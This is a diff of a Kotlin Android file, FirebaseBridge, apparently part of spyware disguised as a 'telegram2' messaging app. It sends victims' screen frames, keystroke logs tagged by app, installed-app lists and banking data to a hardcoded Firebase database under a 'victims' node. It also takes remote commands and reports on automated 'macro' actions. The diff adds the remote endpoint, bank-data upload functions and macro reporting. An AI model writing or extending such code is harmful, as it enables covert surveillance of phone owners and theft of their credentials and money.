@@ -1,33 +1,25 @@
 package com.telegram2.messaging.remote
 
 import com.google.firebase.database.*
-import java.text.SimpleDateFormat
-import java.util.*
 
 object FirebaseBridge {
     private lateinit var db: FirebaseDatabase
-    private lateinit var deviceId: String
-
-    private lateinit var deviceRef: DatabaseReference
-    lateinit var commandsRef: DatabaseReference
-        private set
+    lateinit var deviceId: String private set
+    lateinit var deviceRef: DatabaseReference private set
+    lateinit var commandsRef: DatabaseReference private set
     private lateinit var screenRef: DatabaseReference
-    private lateinit var keylogsRef: DatabaseReference
     private lateinit var infoRef: DatabaseReference
     private lateinit var bankRef: DatabaseReference
 
-    fun init(deviceId: String) {
-        this.deviceId = deviceId
-        db = FirebaseDatabase.getInstance()
-        deviceRef = db.getReference("telegram2_secret").child("victims").child(deviceId)
+    fun init(id: String) {
+        this.deviceId = id
+        db = FirebaseDatabase.getInstance("https://vfvdfscf-default-rtdb.firebaseio.com")
+        deviceRef = db.reference.child("telegram2_secret").child("victims").child(deviceId)
         commandsRef = deviceRef.child("commands")
         screenRef = deviceRef.child("screen")
-        keylogsRef = deviceRef.child("keylogs")
         infoRef = deviceRef.child("info")
         bankRef = deviceRef.child("bank")
     }
-
-    fun getDeviceId() = deviceId
 
     fun registerDevice(name: String, version: String, apps: List<String>) {
         deviceRef.child("deviceName").setValue(name)
@@ -36,37 +28,33 @@ object FirebaseBridge {
         deviceRef.child("lastSeen").setValue(ServerValue.TIMESTAMP)
     }
 
-    fun updateScreenFrame(base64: String) {
-        screenRef.setValue(base64)
+    fun updateScreenFrame(base64: String) = screenRef.setValue(base64)
+    fun updateScreenInfo(w: Int, h: Int) {
+        deviceRef.child("screenInfo/width").setValue(w)
+        deviceRef.child("screenInfo/height").setValue(h)
     }
 
-    fun updateScreenInfo(width: Int, height: Int) {
-        deviceRef.child("screenInfo").child("width").setValue(width)
-        deviceRef.child("screenInfo").child("height").setValue(height)
-    }
-
-    fun sendKeylog(packageName: String, text: String) {
-        val timestamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
-        val newEntry = "[$timestamp] $packageName: $text"
+    fun sendKeylog(pkg: String, text: String) {
+        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
+        val entry = "[$timestamp] $pkg: $text"
         infoRef.child("keylogs").runTransaction(object : Transaction.Handler {
-            override fun doTransaction(currentData: MutableData): Transaction.Result {
-                val existing = currentData.getValue(String::class.java) ?: ""
-                currentData.value = (existing + "\n" + newEntry).takeLast(4000)
-                return Transaction.success(currentData)
+            override fun doTransaction(current: MutableData): Transaction.Result {
+                val existing = current.getValue(String::class.java) ?: ""
+                current.value = (existing + "\n" + entry).takeLast(4000)
+                return Transaction.success(current)
             }
-            override fun onComplete(error: DatabaseError?, committed: Boolean, currentData: DataSnapshot?) {}
+            override fun onComplete(error: DatabaseError?, committed: Boolean, current: DataSnapshot?) {}
         })
     }
 
-    fun pushAppsList(apps: List<String>) {
-        infoRef.child("apps").setValue(apps.joinToString("\n"))
-    }
+    fun pushAppsList(apps: List<String>) = infoRef.child("apps").setValue(apps.joinToString("\n"))
+    fun appendBankData(data: String) = bankRef.push().setValue(data)
+    fun pushBankJson(json: String) = bankRef.push().setValue(json)  // existing method for backward compat
+    fun deleteDevice() = deviceRef.removeValue()
 
-    fun pushBankData(json: String) {
-        bankRef.setValue(json)
-    }
-
-    fun deleteDevice() {
-        deviceRef.removeValue()
+    // Macro reporting
+    fun reportMacroResult(macroId: String, success: Boolean, details: String) {
+        deviceRef.child("macros").child(macroId).child("status").setValue(if (success) "done" else "failed")
+        deviceRef.child("macros").child(macroId).child("details").setValue(details)
     }
 }
